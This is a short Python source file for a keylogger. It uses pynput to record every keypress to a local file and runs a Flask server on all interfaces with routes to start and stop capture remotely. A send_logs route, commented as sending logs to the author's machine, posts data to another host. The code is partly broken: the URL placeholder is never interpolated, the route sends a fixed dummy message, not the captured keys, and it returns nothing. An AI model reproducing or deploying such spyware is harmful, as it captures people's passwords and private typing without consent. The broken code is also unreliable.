from flask import Flask
import requests 
from pynput import keyboard
import threading

log_data = {'log': 'User logged in from remote machine'}

class ControllerKeylogger:
  def __init__(self):
    self.listener = None
    self.running = False

  def start(self):
    if not self.running:
      self.running = True
      self.listener = keyboard.Listener(on_press=self.on_press)
      self.listener.start()

  def stop(self):
    if self.listener:
      self.listener.stop()
      self.running = False
  
  def on_press(self, key):
    with open("keylog.txt","a") as f:
      f.write(str(key)+ "\n")


app = Flask(__name__)

keylogger = ControllerKeylogger()

@app.route('/start_keylogger')
def start_keylogger():
  keylogger.start()
  return "Keylogger started"

@app.route('/stop_keylogger')
def stop_keylogger():
  keylogger.stop()
  return "Keylogger stopped"

#Used For sending logs to my machine 
@app.route('/send_logs')
def send_logs():
  your_flask_server_ip = "192.0.0.1:5000"
  log_data = {'log': 'User logged in from remote machine'}
  requests.post('http://{your_flask_server_ip}/receive_logs', json=log_data)
  return
if __name__ == "__main__":
  app.run(host='0.0.0.0', port=5000)
